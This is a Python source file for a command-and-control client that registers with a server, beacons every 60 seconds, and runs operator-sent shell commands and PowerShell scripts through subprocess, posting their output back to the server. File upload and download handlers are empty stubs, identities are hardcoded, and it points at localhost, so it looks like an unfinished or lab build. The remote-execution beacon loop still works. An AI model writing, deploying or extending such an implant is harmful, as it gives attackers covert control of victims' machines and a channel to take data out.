import requests
import time
import subprocess

class C2Client:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = ""
    
    def register(self, username):
        url = f"{self.server_url}/register"
        
        self.client_id = "unique_client_identification_1" # TODO: Retrieve dynamically
        username = "John Doe 1" # TODO: Retrieve dynamically

        payload = {"username": username, "client_id": self.client_id}
        response = requests.post(url, json=payload)
        print(response.json())

    def beacon(self):
        url = f"{self.server_url}/beacon"
        payload = {"client_id": self.client_id}
        
        operations = requests.post(url, json=payload).json()
        self.handle_operations(operations)

    def report(self, status, result):
        url = f"{self.server_url}/report"
        payload = {"client_id": self.client_id, "status": status, "result": result}
        
        response = requests.post(url, json=payload)
        print(response.json())

    def run(self):
        self.register("John Doe 1")

        while True:
            self.beacon()
            time.sleep(60) # Timeout before next beacon call
            
    def handle_operations(self, operations):
        for op in operations:
            resource = op.get("resource")
            match op.get("mode"):
                case "CMD":
                    self.handle_cmd_operation(resource)
                case "IMP":
                    self.handle_imp_operation(resource)
                case "FUP":
                    self.handle_fup_operation(resource)
                case "FDL":
                    self.handle_fdl_operation(resource)

    def handle_cmd_operation(self, command):
        cmd_out = ""
        status = "CMD_SUCCESS"
        try:
            cmd_out = subprocess.getoutput(command)
        except Exception as e:
            status = "ERROR"
            cmd_out = str(e)
            
        self.report(status, cmd_out)
    
    def handle_imp_operation(self, ps_script):
        cmd_out = ""
        status = "PS_SUCCESS"
        try:
            raw_out = subprocess.run(["powershell", "-Command", ps_script], capture_output=True)
            cmd_out = raw_out.stdout.decode("utf-8")
        except Exception as e:
            status = "ERROR"
            cmd_out = str(e)
            
        self.report(status, cmd_out)
    
    def handle_fup_operation(self, file_path):
        pass
    
    def handle_fdl_operation(self, file_path):
        pass

if __name__ == "__main__":
    client = C2Client("http://localhost:9393")
    client.run()